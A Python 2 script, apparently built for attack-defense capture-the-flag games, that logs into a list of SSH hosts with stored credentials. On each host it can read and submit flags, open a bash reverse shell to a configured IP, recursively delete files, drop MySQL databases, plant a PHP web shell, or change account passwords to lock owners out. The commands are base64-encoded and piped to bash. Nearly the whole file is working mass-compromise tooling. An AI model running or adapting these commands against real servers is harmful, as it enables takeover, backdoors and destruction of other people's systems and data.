#!/usr/bin/env python
# -*- coding: utf-8 -*-

import base64
import paramiko
import time
import random
import hashlib
import string
import sys
from framework.config import *
from framework.flag import *
# from submit_flag import submit_flag

##################
# config import from framework.config
'''
flag_path = '/flag.txt'
reverse_ip = '192.168.37.133'
reverse_port = 6666
web_path = '/var/www/html/'
db_user = 'root'
db_passwd = ''
db_name = 'test'
'''
#################

def submit_flag(flag):
    post_flag(flag)
    print "[+] Submiting flag : %s" % (flag)
    post_flag(flag)
    return True

timeout = 3

ssh_clients = []

def md5(content):
    return hashlib.md5(content).hexdigest()

def random_string(length):
    random_range = string.letters + string.digits
    result = ""
    for i in range(length):
        result += random.choice(random_range)
    return result

class SSHClient():
    def __init__(self, host, port, username, auth, timeout=5):
        self.is_root = False
        self.host = host
        self.port = port
        self.username = username
        self.ssh_session = paramiko.SSHClient()
        self.ssh_session.load_system_host_keys()
        self.ssh_session.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if auth[0]:
            self.password = auth[1]
            self.ssh_session.connect(hostname=self.host, port=self.port, username=self.username, password=self.password, timeout=timeout)
        else:
            self.key_file = auth[1]
            private_key = paramiko.RSAKey._from_private_key_file(self.key_file)
            self.ssh_session.connect(hostname=host, port=port, username=username, key=private_key, timeout=timeout)

    def infomation(self):
        return "%s:%s:%s:%s" % (self.username, self.password, self.host, self.port)

    def exec_command(self, command):
        (stdin, stdout, stderr) = self.ssh_session.exec_command(command)
        return (stdin, stdout, stderr)

    def exec_command_print(ssh, command):
        stdin, stdout, stderr = self.exec_command(command)
        print "-" * 0x10 + " STDOUT " + "-" * 0x10
        print stdout.read()
        print "-" * 0x10 + " STDERR " + "-" * 0x10
        print stderr.read()
        return (stdin, stdout, stderr)

    def check_root(self):
        stdin, stdout, stderr = self.exec_command("id")
        result = stdout.read()
        return ("uid=0" in result, result)

    def change_password(self, new_password):
        is_root = self.check_root()
        if is_root[0]:
            self.is_root = True
            print "[+] Root user detected!"
            stdin, stdout, stderr = self.exec_command("passwd")
            stdin.write("%s\n" % (new_password))
            stdin.write("%s\n" % (new_password))
            stdout.read()
            error_message = stderr.read()[:-1]
            if "success" in error_message:
                self.password = new_password
                return True
            else:
                return False
        else:
            self.is_root = False
            print "[+] Not a root user! (%s)" % (is_root[1])
            stdin, stdout, stderr = self.exec_command("passwd")
            stdin.write("%s\n" % (self.password))
            stdin.write("%s\n" % (new_password))
            stdin.write("%s\n" % (new_password))
            stdout.read()
            error_message = stderr.read()[:-1]
            if "success" in error_message:
                self.password = new_password
                return True
            else:
                return False

    def save_info(self, filename):
        with open(filename, "a+") as f:
            f.write("%s\n" % (self.infomation()))

def get_flag_2(ssh_client):
    flag = ssh_client.exec_command("curl " + get_flag_url)[1].read().strip("\n\t ")
    return flag

def get_flag(ssh_client):
    flag = ssh_client.exec_command("cat " + flag_path)[1].read().strip("\n\t ")
    return flag

def extend_cmd_exec(ssh_client,cmd):
    is_read = True
    if cmd == 'reverse_shell':
        is_read = False
        cmd = '/bin/bash -i >& /dev/tcp/%s/%s 0>&1' %(reverse_ip,reverse_port)
    elif cmd == 'rm_file':
        cmd = 'rm -rf %s'%rm_paths
    elif cmd == 'get_shell':
        cmd = "echo '<?php system($_POST[222]);?>' > %s/admin.php"% web_path
    elif cmd == "rm_db":
        cmd = ''
        for db in db_name:
            cmd += 'mysql -u%s -p%s -e "drop database %s;";' % (db_user, db_passwd, db)
    elif cmd == "get_flag" or cmd == "get_flag_2":
        # Because we have run get flag before, so we do notiong here
        return
    elif cmd == "change_password":
        print '[+] start to change password in the remote host'
        new_password = md5(ssh_password)
        if ssh_client.change_password(new_password):
            ssh_client.save_info("autossh/success.log")
            ssh_client.save_info('autossh/now.txt')
            print "[+] %s => %s (Success!)" % (ssh_client.infomation(), new_password)
        else:
            print "[-] %s => %s (Failed!)" % (ssh_client.infomation(), new_password)
        return
            
    cmd = base64.b64encode(cmd)
    cmd = "echo %s | base64 -d| bash" %cmd
    print "[-] Attack payload:" + cmd
    if is_read:
        print ssh_client.exec_command(cmd)[1].read().strip("\n\t ")
    else:
        ssh_client.exec_command(cmd)

def main():
    if len(sys.argv) != 3:
        print "Usage : \n\tpython %s [FILENAME] [cmd]" % (sys.argv[0])
        exit(1)
    filename = sys.argv[1]
    cmd = sys.argv[2]
    print "[+] Loading file : %s" % (filename)
    with open(filename) as f:
        for line in f:
            line = line.rstrip("\n")
            data = line.split(":")
            username = data[0]
            password = data[1]
            host = data[2]
            port = int(data[3])
            auth = (True, password)
            print "[+] Trying login : %s" % (line)
            try:
                ssh_client = SSHClient(host, port, username, auth, timeout=5)
                ssh_clients.append(ssh_client)
            except Exception as e:
                print "[-] %s" % (e)
    print "[+] Login step finished!"
    print "[+] Got [%d] clients!" % (len(ssh_clients))
    while True:
        if len(ssh_clients) == 0:
            print "[+] No client... Breaking..."
            break
        # If we want to  change passwd, we need to rewrite the now.txt
        if cmd == "change_password":
            open('autossh/now.txt','w').write('')
        for ssh_client in ssh_clients:
            # Get flag
            if cmd == "get_flag" or cmd == "get_flag_2":
                print "[+] Starting get flag..."
                flag = get_flag(ssh_client)
                print "[+] Flag : %s" % (flag)
                if submit_flag(flag):
                    print "[+] Submit success!"
                else:
                    print "[-] Submit failed!"
            # Try to execute cmd 
            print "[+] Execute user cmd:%s" % cmd
            extend_cmd_exec(ssh_client,cmd)
        for i in range(script_runtime_span):
            print "[+] Waiting : %s seconds..." % (script_runtime_span - i)
            time.sleep(1)

def command_info():
    print ""
    print "Support command:"
    print "rm_file".ljust(20," ") + "rm files in the server"
    print "rm_db  ".ljust(20," ") + "drop database in the server"
    print "reverse_shell".ljust(20," ") + "reverse  shell"
    print "change_password".ljust(20," ") + "change the password of the server to the random string"
    print "get_flag".ljust(20," ") + "get flag by reading local file" 
    print "get_flag_2".ljust(20," ") + "get flag by visiting remote flag url" 
    print ""

if __name__ == "__main__":
    command_info()
    main()

